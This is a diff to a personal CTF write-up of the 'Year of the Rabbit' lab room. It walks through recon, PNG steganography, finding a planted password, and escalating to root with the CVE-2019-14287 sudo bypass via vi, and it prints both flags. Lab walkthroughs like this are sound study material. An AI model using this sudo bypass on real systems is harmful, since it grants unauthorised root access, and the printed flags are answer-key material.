@@ -1,6 +1,6 @@
 # Year of the Rabbit
 
-Another CTF-like room...
+Another CTF-like room...but one that was not too hard and impressive in its very longevity. Solved it almost entirely without help, except for near the end where I had to get a hint on the step after getting ssh access: I got distracted with a meaningless file, and didn't know about locate. Other than that, did well! Particularly proud about recognising a programming language (eventually) and recognising a prior CVE I'd used elsewhere.
 
 1. Recon revealed 21, 22 and 80, all running standard services. FTP didn't support anonymous login.
 
@@ -41,7 +41,7 @@ Another CTF-like room...
     ERRORS DETECTED in Hot_Babe.png
     ```
 
-11. I ran  `cat Hot_Babe.png | tail -c +$((16#73adf))` to get:
+11. I ran  `cat Hot_Babe.png | tail -c +$((16#73adf))` (note the parameter expansion to convert a hex value to decimal as required by `tail`) to get:
 
     ```
     IEND�B`�Ot9RrG7h2~24?
@@ -173,4 +173,45 @@ Another CTF-like room...
     END MESSAGE
     ```
 
-16. No `sudo -l`, nothing interesting in find -perm. Another home dir for `gwendoline` containing `user.txt`, but I couldn't read it. However, in eli's folder, there is a file called `core` that is quite interesting.
+16. No `sudo -l`, nothing interesting in find -perm. Another home dir for `gwendoline` containing `user.txt`, but I couldn't read it. However, in eli's folder, there is a file called `core` that looked quite interesting: strings revealed it contained css, html, lots of reference to gtk etc. Maybe some sort of X server I could mount?
+
+    > I spent a lot of time (like, several hours) messing about with `core`. But it was a red herring. I wasn't getting anywhere and so finally went for a hint.
+
+17. Ignoring `core`, the next step was actually something I had idly considered on first joining: in the message about, "s3cr3t: is an odd out-of-place spelling. `locate s3cr3t` revealed:
+
+    ```
+    /usr/games/s3cr3t
+    /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
+    /var/www/html/sup3r_s3cr3t_fl4g.php
+    ```
+
+18. Catting `/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!` revealed:
+
+    ```
+    Your password is awful, Gwendoline.
+    It should be at least 60 characters long! Not just MniVCQVhQHUNI
+    Honestly!
+
+    Yours sincerely
+    -Root
+    ```
+
+19. I ssh'd on with gwendoline using these creds and read the user flag: `THM{1107174691af9ff3681d2b5bdb5740b1589bae53}`
+
+20. `sudo -l` revealed:
+
+    ```
+    Matching Defaults entries for gwendoline on year-of-the-rabbit:
+        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+    User gwendoline may run the following commands on year-of-the-rabbit:
+        (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
+    ```
+
+    This looks suspiciously like `CVE-2019-14287`, which I dealt with in the room "agentsudoctf".
+
+21. Sure enough, `sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt` opened vim, and then `:! /bin/sh` got me a root shell.
+
+22. The final flag, at `/root/root.txt`, was `THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}`. Finally!
+
+Overall, a very long and tough (but not too tough!) room. Glad its over, but had fun along the way.
